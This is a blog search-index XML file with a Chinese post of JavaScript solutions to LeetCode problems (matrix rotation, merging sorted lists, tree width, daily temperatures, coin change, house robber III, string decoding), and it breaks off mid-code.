<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>刷题小分队</title>
      <link href="2021/02/01/%E5%88%B7%E9%A2%98%E5%B0%8F%E5%88%86%E9%98%9F/"/>
      <url>2021/02/01/%E5%88%B7%E9%A2%98%E5%B0%8F%E5%88%86%E9%98%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="旋转矩阵"><a href="#旋转矩阵" class="headerlink" title="旋转矩阵"></a>旋转矩阵</h2><ul><li><a href="https://leetcode-cn.com/problems/rotate-image/" target="_blank" rel="noopener">leetcode48</a></li></ul><blockquote><p>你必须在原地旋转图像，这意味着你需要直接修改输入的二维矩阵。请不要使用另一个矩阵来旋转图像。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> rotate <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">const</span> len <span class="token operator">=</span> matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            matrix<span class="token punctuation">[</span>len <span class="token operator">-</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><ul><li>具体过程如下：</li></ul><pre class=" language-js"><code class="language-js"><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span></code></pre><h2 id="合并两个有序链表"><a href="#合并两个有序链表" class="headerlink" title="合并两个有序链表"></a>合并两个有序链表</h2><ul><li><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/" target="_blank" rel="noopener">leetcode21</a></li></ul><pre class=" language-js"><code class="language-js">将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 示例：输入：<span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span>输出：<span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> mergeTwoLists <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>l1<span class="token punctuation">,</span> l2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l1 <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> l2    <span class="token keyword">if</span> <span class="token punctuation">(</span>l2 <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> l1    <span class="token keyword">if</span> <span class="token punctuation">(</span>l1<span class="token punctuation">.</span>val <span class="token operator">&lt;</span> l2<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>        l1<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>l1<span class="token punctuation">.</span>next<span class="token punctuation">,</span> l2<span class="token punctuation">)</span>        <span class="token keyword">return</span> l1    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        l2<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>l1<span class="token punctuation">,</span> l2<span class="token punctuation">.</span>next<span class="token punctuation">)</span>        <span class="token keyword">return</span> l2    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="求二叉树的宽度"><a href="#求二叉树的宽度" class="headerlink" title="求二叉树的宽度"></a>求二叉树的宽度</h2><ul><li><a href="https://leetcode-cn.com/problems/maximum-width-of-binary-tree/" target="_blank" rel="noopener">leetcode662</a></li><li>思路：层次遍历，记录每层的宽度</li><li>左孩子的索引值为 <code>index *  2 + 1</code>，右孩子的索引值为<code>index * 2 + 2</code>，利用节点值来记录索引值</li><li>为了防止无限乘2超出范围，每层索引都减去该层第一个索引的值</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> widthOfBinaryTree <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res <span class="token operator">=</span> <span class="token number">0</span>    root<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">0</span>    queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> len <span class="token operator">=</span> queue<span class="token punctuation">.</span>length        <span class="token keyword">let</span> firstNumber <span class="token operator">=</span> queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>val        res <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> queue<span class="token punctuation">[</span>queue<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>val <span class="token operator">-</span> queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> node <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            node<span class="token punctuation">.</span>val <span class="token operator">-</span><span class="token operator">=</span> firstNumber            <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">)</span>                node<span class="token punctuation">.</span>left<span class="token punctuation">.</span>val <span class="token operator">=</span> node<span class="token punctuation">.</span>val <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>right <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">)</span>                node<span class="token punctuation">.</span>right<span class="token punctuation">.</span>val <span class="token operator">=</span> node<span class="token punctuation">.</span>val <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="每日温度"><a href="#每日温度" class="headerlink" title="每日温度"></a>每日温度</h2><ul><li><a href="https://leetcode-cn.com/problems/daily-temperatures/" target="_blank" rel="noopener">leetcode739</a></li></ul><pre class=" language-js"><code class="language-js">请根据每日 气温 列表，重新生成一个列表。对应位置的输出为：要想观测到更高的气温，至少需要等待的天数。如果气温在这之后都不会升高，请在该位置用 <span class="token number">0</span> 来代替。例如，给定一个列表 temperatures <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">]</span>，你的输出应该是 <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>。提示：气温 列表长度的范围是 <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30000</span><span class="token punctuation">]</span>。每个气温的值的均为华氏度，都是在 <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span> 范围内的整数。</code></pre><h3 id="暴力法"><a href="#暴力法" class="headerlink" title="暴力法"></a>暴力法</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> dailyTemperatures <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> T<span class="token punctuation">.</span>length    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> T<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">-</span> j            <span class="token punctuation">}</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>   <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h3><ul><li>维护单调递减栈，一旦入栈元素大于栈顶元素，则 pop，并记录索引的差值</li><li><a href="https://leetcode-cn.com/problems/daily-temperatures/solution/tu-jie-suan-fa-739mei-ri-wen-du-javascriptjie-ti-b/" target="_blank" rel="noopener">图示</a></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> dailyTemperatures <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> T<span class="token punctuation">.</span>length    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> T<span class="token punctuation">[</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">[</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">-</span> stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span>            stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="零钱兑换"><a href="#零钱兑换" class="headerlink" title="零钱兑换"></a>零钱兑换</h2><ul><li><a href="https://leetcode-cn.com/problems/coin-change/" target="_blank" rel="noopener">leetcode322</a></li></ul><pre class=" language-js"><code class="language-js">给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总金额，返回 <span class="token operator">-</span><span class="token number">1</span>。你可以认为每种硬币的数量是无限的。示例 <span class="token number">1</span>：输入：coins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> amount <span class="token operator">=</span> <span class="token number">11</span>输出：<span class="token number">3</span> 解释：<span class="token number">11</span> <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">1</span>示例 <span class="token number">2</span>：输入：coins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> amount <span class="token operator">=</span> <span class="token number">3</span>输出：<span class="token operator">-</span><span class="token number">1</span></code></pre><ul><li>设<code>dp[i]</code> 表示总金额为 i 的时候最优解法的硬币数</li><li>若面值有1，2，5要凑够120元，此时可以拿一枚面值为1的，最优个数为 <code>dp[119] + 1</code>，拿一枚面试为2的，最优个数为<code>dp[118] + 1</code>，拿一枚面值为5的，最优个数为<code>dp[115] + 1</code>，取三种的最小值即可</li><li>状态转移方程：<code>dp[i] = Math.min(dp[i - coin] + 1, dp[i - coin] + 1, ...)</code></li><li>边界：<code>dp[0] = 0</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> coinChange <span class="token operator">=</span> <span class="token punctuation">(</span>coins<span class="token punctuation">,</span> amount<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">let</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span> amount <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span> <span class="token number">Infinity</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> amount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> coin <span class="token keyword">of</span> coins<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> coin <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> coin<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>amount<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">Infinity</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">:</span> dp<span class="token punctuation">[</span>amount<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="打家劫舍iii（DFS）"><a href="#打家劫舍iii（DFS）" class="headerlink" title="打家劫舍iii（DFS）"></a>打家劫舍iii（DFS）</h2><ul><li><a href="https://leetcode-cn.com/problems/house-robber-iii/" target="_blank" rel="noopener">Leetcode337</a></li><li>每个节点都设置：<strong>[不偷, 偷]</strong></li><li>当前节点被偷时，其左右孩子不能偷</li><li>当前节点未被偷时，其左右孩子可以偷，也可以不偷，取 <strong>[不偷, 偷]</strong> 的较大者</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> rob <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// [不偷, 偷]</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// left 为 root 左侧子节点的[不偷值, 偷值]</span>    <span class="token keyword">let</span> left <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// right 为 root 右侧子节点的[不偷值, 偷值]</span>    <span class="token keyword">let</span> right <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 每一个节点的不偷值都是： 左侧子节点的最大值 + 右侧子节点的最大值</span>    res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>left<span class="token punctuation">)</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 每一个节点的偷值都是：左侧子节点的不偷值 + 右侧子节点的不偷值 + 该节点的值</span>    res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> root<span class="token punctuation">.</span>val <span class="token operator">+</span> left<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> right<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="字符串解码"><a href="#字符串解码" class="headerlink" title="字符串解码"></a>字符串解码</h2><ul><li><a href="https://leetcode-cn.com/problems/decode-string/" target="_blank" rel="noopener">leetcode394</a></li></ul><pre class=" language-js"><code class="language-js">示例 <span class="token number">1</span>：输入：s <span class="token operator">=</span> <span class="token string">"3[a]2[bc]"</span>输出：<span class="token string">"aaabcbc"</span>示例 <span class="token number">2</span>：输入：s <span class="token operator">=</span> <span class="token string">"3[a2[c]]"</span>输出：<span class="token string">"accaccacc"</span>示例 <span class="token number">3</span>：输入：s <span class="token operator">=</span> <span class="token string">"2[abc]3[cd]ef"</span>输出：<span class="token string">"abcabccdcdcdef"</span>示例 <span class="token number">4</span>：输入：s <span class="token operator">=</span> <span class="token string">"abc3[cd]xyz"</span>输出：<span class="token string">"abccdcdcdxyz"</span></code></pre><ul><li>采用正则表达式将<code>3[a]</code> 的格式转换成<code>aaa</code>即可</li><li>匹配到<code>3[a]</code>之后，找到<code>[</code>的位置，前面为数字，后面为字符，按次数拼接</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> decodeString <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> reg <span class="token operator">=</span> <span class="token regex">/\d+\[[a-z]+\]/g</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>reg<span class="token punctuation">,</span> item <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> pos  <span class="token operator">=</span> item<span class="token punctuation">.</span><span 